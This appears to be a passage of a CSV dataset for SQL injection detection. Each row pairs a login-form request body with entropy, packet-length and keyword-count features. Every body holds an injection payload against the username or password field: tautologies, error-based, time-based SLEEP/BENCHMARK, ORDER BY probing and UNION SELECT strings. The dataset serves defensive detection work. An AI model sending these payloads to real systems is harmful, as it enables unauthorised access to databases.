,body,entropy,packet_length,sqli_keywords
114,uname=-1394' OR 8102=8102#&pass=fsdfsdf,4.406821128952238,49,5
115,uname=-2465' OR 9442=2627#&pass=fsdfsdf,4.304257026388135,49,5
116,uname=-2465' OR 9442=2627#&pass=fsdfsdf,4.304257026388135,49,5
117,uname=-7289' USymSOXIJM#&pass=fsdfsdf,4.594456406111019,43,3
118,"uname=-7155"" OR 1282=4190#&pass=fsdfsdf",4.458103180234289,49,5
119,"uname=-7155"" OR 1282=4190#&pass=fsdfsdf",4.458103180234289,49,5
120,"uname=-5994"" OR 8102=8102#&pass=fsdfsdf",4.426177218751301,49,5
121,"uname=-5994"" OR 8102=8102#&pass=fsdfsdf",4.426177218751301,49,5
122,uname=-2632')) OR 7393=2088#&pass=fsdfsdf,4.4546361507484775,55,5
123,uname=-9237')) OR 8102=8102#&pass=fsdfsdf,4.473048041045148,55,5
124,uname=-3557'))) OR 5852=7034#&pass=fsdfsdf,4.433634982148037,58,5
125,uname=-6511'))) OR 8102=8102#&pass=fsdfsdf,4.38601593452899,58,5
126,uname=-5137%' OR 6016=4668#&pass=fsdfsdf,4.484183719779187,52,5
127,uname=-5137%' OR 6016=4668#&pass=fsdfsdf,4.484183719779187,52,5
128,uname=-1390%' OR 8102=8102#&pass=fsdfsdf,4.396439344671015,52,5
129,uname=-6292%' OR 6292=2501#&pass=fsdfsdf,4.343942707918267,52,5
130,uname=-6292%' OR 6292=2501#&pass=fsdfsdf,4.343942707918267,52,5
131,uname=-6472%' USymSOXIJM#&pass=fsdfsdf,4.649114684439283,46,3
132,"uname=-5625"") OR 8409=2812#&pass=fsdfsdf",4.515311532225102,52,5
133,"uname=-5625"") OR 8409=2812#&pass=fsdfsdf",4.515311532225102,52,5
134,"uname=-9950"") OR 8102=8102#&pass=fsdfsdf",4.415311532225101,52,5
135,"uname=-9950"") OR 8102=8102#&pass=fsdfsdf",4.415311532225101,52,5
136,"uname=-9555"")) OR 9286=9623#&pass=fsdfsdf",4.405855662943599,55,5
137,"uname=-9555"")) OR 9286=9623#&pass=fsdfsdf",4.405855662943599,55,5
138,"uname=-7831"")) OR 8102=8102#&pass=fsdfsdf",4.405855662943599,55,5
139,"uname=-7831"")) OR 8102=8102#&pass=fsdfsdf",4.405855662943599,55,5
140,"uname=-1708""))) OR 3349=1081#&pass=fsdfsdf",4.463280517810812,58,5
141,"uname=-1708""))) OR 3349=1081#&pass=fsdfsdf",4.463280517810812,58,5
142,"uname=-9124""))) OR 8102=8102#&pass=fsdfsdf",4.39768795823549,58,5
143,"uname=-9124""))) OR 8102=8102#&pass=fsdfsdf",4.39768795823549,58,5
144,uname=-9978')) AS eDNZ WHERE 4030=4030 OR 2063=2402#&pass=fsdfsdf,4.790997043531414,89,7
145,uname=-5914')) AS nBKk WHERE 6398=6398 OR 8102=8102#&pass=fsdfsdf,4.887376466708188,89,7
146,"uname=-7730"")) AS cugk WHERE 3178=3178 OR 9493=6404#&pass=fsdfsdf",4.837451659049164,89,7
147,"uname=-7730"")) AS cugk WHERE 3178=3178 OR 9493=6404#&pass=fsdfsdf",4.837451659049164,89,7
148,"uname=-8561"")) AS ubrU WHERE 2689=2689 OR 8102=8102#&pass=fsdfsdf",4.770305074793775,89,7
149,"uname=-8561"")) AS ubrU WHERE 2689=2689 OR 8102=8102#&pass=fsdfsdf",4.770305074793775,89,7
150,uname=-1950') AS JDNZ WHERE 6915=6915 OR 9104=3316#&pass=fsdfsdf,4.790873781480404,86,7
151,uname=-6326') AS HYee WHERE 1812=1812 OR 8102=8102#&pass=fsdfsdf,4.591578664259099,86,7
152,"uname=-8492"") AS WIuQ WHERE 8615=8615 OR 4469=7421#&pass=fsdfsdf",4.804229296672176,86,7
153,"uname=-8492"") AS WIuQ WHERE 8615=8615 OR 4469=7421#&pass=fsdfsdf",4.804229296672176,86,7
154,"uname=-8717"") AS KUKo WHERE 3529=3529 OR 8102=8102#&pass=fsdfsdf",4.847274413893479,86,7
155,"uname=-8717"") AS KUKo WHERE 3529=3529 OR 8102=8102#&pass=fsdfsdf",4.847274413893479,86,7
156,uname=-6172) OR 4126=7568#&pass=fsdfsdf,4.406821128952238,49,4
157,uname=-6172) OR 4126=7568#&pass=fsdfsdf,4.406821128952238,49,4
158,uname=-9401) OR 8102=8102#&pass=fsdfsdf,4.336182987871123,49,4
159,uname=-9401) OR 8102=8102#&pass=fsdfsdf,4.336182987871123,49,4
160,uname=-4011)) OR 3507=3132#&pass=fsdfsdf,4.396439344671014,52,4
161,uname=-4011)) OR 3507=3132#&pass=fsdfsdf,4.396439344671014,52,4
162,uname=-9500)) OR 8102=8102#&pass=fsdfsdf,4.334183719779189,52,4
163,uname=-9500)) OR 8102=8102#&pass=fsdfsdf,4.334183719779189,52,4
164,uname=-1742))) OR 7980=7965#&pass=fsdfsdf,4.503416638553356,55,4
165,uname=-1742))) OR 7980=7965#&pass=fsdfsdf,4.503416638553356,55,4
166,uname=-8720))) OR 8102=8102#&pass=fsdfsdf,4.271470906740504,55,4
167,uname=-8720))) OR 8102=8102#&pass=fsdfsdf,4.271470906740504,55,4
168,uname=-7000 OR 9516=6587#&pass=fsdfsdf,4.346225868535943,46,4
169,uname=-7000 OR 9516=6587#&pass=fsdfsdf,4.346225868535943,46,4
170,uname=-9243 OR 8102=8102#&pass=fsdfsdf,4.346225868535942,46,4
171,uname=-9243 OR 8102=8102#&pass=fsdfsdf,4.346225868535942,46,4
172,uname=-6867)) AS XoYm WHERE 4407=4407 OR 7171=2864#&pass=fsdfsdf,4.715018266288633,86,6
173,uname=-6867)) AS XoYm WHERE 4407=4407 OR 7171=2864#&pass=fsdfsdf,4.715018266288633,86,6
174,uname=-1114)) AS BZvh WHERE 6826=6826 OR 8102=8102#&pass=fsdfsdf,4.689464015923012,86,6
175,uname=-1114)) AS BZvh WHERE 6826=6826 OR 8102=8102#&pass=fsdfsdf,4.689464015923012,86,6
176,uname=-3389) AS XBWu WHERE 8264=8264 OR 7545=9838#&pass=fsdfsdf,4.748961225321278,83,6
177,uname=-3389) AS XBWu WHERE 8264=8264 OR 7545=9838#&pass=fsdfsdf,4.748961225321278,83,6
178,uname=-4298) AS epAA WHERE 6520=6520 OR 8102=8102#&pass=fsdfsdf,4.653723130083182,83,6
179,uname=-4298) AS epAA WHERE 6520=6520 OR 8102=8102#&pass=fsdfsdf,4.653723130083182,83,6
180,uname=fdsfds') OR NOT 1978=6848#&pass=fsdfsdf,4.305540252212915,59,5
181,uname=fdsfds') OR NOT 5984=5984#&pass=fsdfsdf,4.233426641149881,59,5
182,uname=fdsfds' OR NOT 7511=7811#&pass=fsdfsdf,4.126950016748872,56,5
183,uname=fdsfds' OR NOT 5984=5984#&pass=fsdfsdf,4.172404562203417,56,5
184,uname=fdsfds' OR NOT 5984=5984#&pass=fsdfsdf,4.172404562203417,56,5
185,uname=fdsfds' OR NOT 6929=2049#&pass=fsdfsdf,4.2007025735178845,56,5
186,"uname=fdsfds' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(7464=7464,1))),0x716a6b7671,0x78))s), 8446744073709551610, 8446744073709551610)))-- JYkZ&pass=fsdfsdf",5.011298617119382,267,12
187,"uname=fdsfds' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(9907=9907,1))),0x716a6b7671,0x78))s), 8446744073709551610, 8446744073709551610)))-- sugN&pass=fsdfsdf",4.9694938843723016,266,12
188,"uname=fdsfds' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(2982=2982,1))),0x716a6b7671,0x78))x))-- xJdC&pass=fsdfsdf",5.056249427496135,194,10
189,"uname=fdsfds' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(2982=2982,1))),0x716a6b7671,0x78))x))-- xJdC&pass=fsdfsdf",5.056249427496135,194,10
190,"uname=fdsfds' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(4571=4571,1))),0x716a6b7671,0x78))x))-- USHb&pass=fsdfsdf",5.020283402839836,193,10
191,"uname=fdsfds' AND GTID_SUBSET(CONCAT(0x7170766a71,(SELECT (ELT(8334=8334,1))),0x716a6b7671),8334)-- yjfE&pass=fsdfsdf",5.089441836446774,157,8
192,"uname=(SELECT CONCAT(0x7170766a71,(ELT(1796=1796,1)),0x716a6b7671))&pass=fsdfsdf",4.5579717644257185,106,5
193,"uname=(SELECT CONCAT(0x7170766a71,(ELT(1796=1796,1)),0x716a6b7671))&pass=fsdfsdf",4.5579717644257185,106,5
194,uname=fdsfds';SELECT SLEEP(5)#&pass=fsdfsdf,4.2374411389168944,55,7
195,uname=fdsfds';SELECT SLEEP(5)-- reQo&pass=fsdfsdf,4.449007487405744,61,8
196,uname=fdsfds';(SELECT * FROM (SELECT(SLEEP(5)))wOaq)#&pass=fsdfsdf,4.6254738088774765,96,8
197,uname=fdsfds';(SELECT * FROM (SELECT(SLEEP(5)))Goab)-- Qzjs&pass=fsdfsdf,4.766653300891517,102,9
198,"uname=fdsfds';SELECT BENCHMARK(5000000,MD5(0x61627068))#&pass=fsdfsdf",4.910999957023229,87,8
199,"uname=fdsfds';SELECT BENCHMARK(5000000,MD5(0x5163614c))-- qNji&pass=fsdfsdf",5.0784096913292975,93,9
200,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(5)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,9
201,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(5)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,9
202,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(0)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,9
203,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(0)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,9
204,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(5)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,9
205,uname=fdsfds' AND (SELECT 9883 FROM (SELECT(SLEEP(5)))ydon)-- ldrU&pass=fsdfsdf,4.871394476074932,109,9
206,uname=fdsfds' ORDER BY 1#&pass=fsdfsdf,4.0407090139455,48,5
207,uname=fdsfds' ORDER BY 1#&pass=fsdfsdf,4.0407090139455,48,5
208,uname=fdsfds' ORDER BY 6104#&pass=fsdfsdf,4.238666566058884,51,5
209,uname=fdsfds' ORDER BY 10#&pass=fsdfsdf,4.109138039864114,49,5
210,uname=fdsfds' ORDER BY 6#&pass=fsdfsdf,4.0407090139455,48,5
211,uname=fdsfds' ORDER BY 6#&pass=fsdfsdf,4.0407090139455,48,5
212,uname=fdsfds' ORDER BY 8#&pass=fsdfsdf,4.0407090139455,48,5
213,uname=fdsfds' ORDER BY 8#&pass=fsdfsdf,4.0407090139455,48,5
214,uname=fdsfds' ORDER BY 9#&pass=fsdfsdf,4.0407090139455,48,5
215,"uname=fdsfds' UNION ALL SELECT CONCAT(0x7170766a71,0x586441417443517a59714642456953416e70716b706a465a596763574f49546a556468534e4e6678,0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#&pass=fsdfsdf",4.670939867097161,230,14
216,"uname=fdsfds' UNION ALL SELECT CONCAT(0x7170766a71,0x586441417443517a59714642456953416e70716b706a465a596763574f49546a556468534e4e6678,0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL UNION ALL SELECT CONCAT(0x7170766a71,0x436c71446b5961766c68596377617650784a77495747474979576f6843484d65425552494a657141,0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#&pass=fsdfsdf",4.576109950519345,429,25
217,"uname=fdsfds&pass=fsdfsdf.,.,),'(.""",3.739877574570946,49,4
218,"uname=fdsfds&pass=fsdfsdf'qEdkYh<'"">IjhEeX",4.184482757226366,52,5
219,uname=fdsfds&pass=fsdfsdf') AND 6112=7726 AND ('APij'='APij,4.406042787009911,83,10
220,uname=fdsfds&pass=fsdfsdf') AND 6865=6865 AND ('ijhW'='ijhW,4.406042787009911,83,10
221,uname=fdsfds&pass=fsdfsdf' AND 9429=7038 AND 'yxYK'='yxYK,4.4799178127829204,77,10
222,uname=fdsfds&pass=fsdfsdf' AND 9429=7038 AND 'yxYK'='yxYK,4.4799178127829204,77,10
223,uname=fdsfds&pass=fsdfsdf' AND 6865=6865 AND 'ZobS'='ZobS,4.304479216291693,77,10
224,uname=fdsfds&pass=fsdfsdf' AND 6865=6865 AND 'ZobS'='ZobS,4.304479216291693,77,10
225,uname=fdsfds&pass=fsdfsdf) AND 3820=4660 AND (8617=8617,4.365463295689618,71,6
226,uname=fdsfds&pass=fsdfsdf) AND 3820=4660 AND (8617=8617,4.365463295689618,71,6
227,uname=fdsfds&pass=fsdfsdf) AND 6865=6865 AND (2749=2749,4.342824886638045,71,6
228,uname=fdsfds&pass=fsdfsdf) AND 6865=6865 AND (2749=2749,4.342824886638045,71,6
229,uname=fdsfds&pass=fsdfsdf AND 3143=6298,4.109138039864114,45,4
230,uname=fdsfds&pass=fsdfsdf AND 3143=6298,4.109138039864114,45,4
231,uname=fdsfds&pass=fsdfsdf AND 6865=6865,3.8527277834538585,45,4
232,uname=fdsfds&pass=fsdfsdf AND 6865=6865,3.8527277834538585,45,4
233,uname=fdsfds&pass=fsdfsdf AND 7609=9882-- lJxj,4.3794491194680845,54,5
234,uname=fdsfds&pass=fsdfsdf AND 7609=9882-- lJxj,4.3794491194680845,54,5
235,uname=fdsfds&pass=fsdfsdf AND 6865=6865-- ggGy,4.162057815120259,54,5
236,uname=fdsfds&pass=fsdfsdf AND 6865=6865-- ggGy,4.162057815120259,54,5
237,uname=fdsfds&pass=(SELECT (CASE WHEN (4507=3068) THEN 0x66736466736466 ELSE (SELECT 3068 UNION SELECT 6990) END)),4.685785761069005,155,13
238,uname=fdsfds&pass=(SELECT (CASE WHEN (4507=3068) THEN 0x66736466736466 ELSE (SELECT 3068 UNION SELECT 6990) END)),4.685785761069005,155,13
239,uname=fdsfds&pass=(SELECT (CASE WHEN (2398=2398) THEN 0x66736466736466 ELSE (SELECT 6602 UNION SELECT 1070) END)),4.742813259569655,155,13
240,uname=fdsfds&pass=(SELECT (CASE WHEN (2398=2398) THEN 0x66736466736466 ELSE (SELECT 6602 UNION SELECT 1070) END)),4.742813259569655,155,13
241,"uname=fdsfds&pass=(SELECT CONCAT(CONCAT(0x7170766a71,(CASE WHEN (7543=7543) THEN 0x31 ELSE 0x30 END)),0x716a6b7671))",4.824690133918008,158,11
242,"uname=fdsfds&pass=(SELECT CONCAT(CONCAT(0x7170766a71,(CASE WHEN (7543=7543) THEN 0x31 ELSE 0x30 END)),0x716a6b7671))",4.824690133918008,158,11
243,uname=fdsfds&pass=fsdfsdf') AND 2872=8985#,4.186860506514697,54,5
244,uname=fdsfds&pass=fsdfsdf') AND 4426=4426#,4.061976875613826,54,5
245,uname=fdsfds&pass=fsdfsdf' AND 7302=1560#,4.238666566058884,51,5
246,uname=fdsfds&pass=fsdfsdf' AND 7302=1560#,4.238666566058884,51,5
247,uname=fdsfds&pass=fsdfsdf' AND 4426=4426#,3.9947641270344936,51,5
248,uname=fdsfds&pass=fsdfsdf' AND 4426=4426#,3.9947641270344936,51,5
249,"uname=fdsfds&pass=fsdfsdf"" AND 8643=3126#",4.1898860782540055,51,5
250,"uname=fdsfds&pass=fsdfsdf"" AND 8643=3126#",4.1898860782540055,51,5
251,"uname=fdsfds&pass=fsdfsdf"" AND 4426=4426#",3.9947641270344936,51,5
252,"uname=fdsfds&pass=fsdfsdf"" AND 4426=4426#",3.9947641270344936,51,5
253,uname=fdsfds&pass=fsdfsdf')) AND 3032=6678#,4.266397243517744,57,5
254,uname=fdsfds&pass=fsdfsdf')) AND 4426=4426#,4.080350731889837,57,5
255,uname=fdsfds&pass=fsdfsdf'))) AND 6659=3391#,4.217859107657963,60,5
